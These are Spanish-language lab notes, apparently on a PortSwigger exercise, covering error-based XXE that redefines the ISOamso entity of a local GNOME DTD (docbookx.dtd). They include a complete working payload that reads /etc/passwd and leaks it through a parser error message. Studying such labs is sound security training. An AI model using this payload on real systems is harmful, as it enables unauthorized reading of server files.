# XXE usando DTD local para extraer datos

Tags: #XXE #PortSwigger #XML 

```bash 
En este lab se continua abordando ataques XXE avanzados. Esta vez, el laboratorio requiere que reutilicemos un DTD ya presente en el sistema de la víctima para redefinir una entidad y provocar una lectura de datos sensibles. Específicamente, aprovechamos el archivo ‘**docbookx.dtd**‘ que suele estar disponible en sistemas con entorno GNOME.

Definir una entidad que referencia este DTD y redefinimos una entidad existente llamada ISOamso para incluir una carga maliciosa. Esta carga intenta leer el contenido del archivo passwd y generar un error utilizando esa información en una ruta inválida. Aunque el resultado no se muestra directamente, el error generado incluye el contenido leído, resolviendo así el laboratorio.
```

## Usar un archivo DTD local 

```xml 
<!-- Se modifica una entidad del archivo DTD local '/usr/share/yelp/dtd/docbookx.dtd' llamada ISOamso en sistemas GNOME el cual se expandirá porque ya se encuentra en el archivo.

Se usará una petición modificada colocando una entidad de parámetro y usar los mensajes de error para cargar el contenido en la respuesta del error -->


<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE foo [
	<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd"> 
	<!ENTITY % ISOamso '
	<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
	<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; exfil SYSTEM &#x27;file://noexisto/&#x25;file;&#x27;>">
	&#x25;eval;
	&#x25;exfil;
	'> 
	%local_dtd;
	]>      
	<stockCehck>
		<productId>
			1
		</productId>
		<storedID>
			1
		</storedId>
	</stockCheck>


Notas:
	1. Colocar % en hexadecimal = &#x25, esto se hara en la segunda entidad de parámetro para que sea visualizada como un texto y no lo expanda 
	2. Como se esta dentro de otra entidad, se debe cambiar el '&' de &#x25 en hexadecimal y es '& = &#x26'.
	3. Tambien de debe de cambiar la comilla simple " ' = &#x27 "
```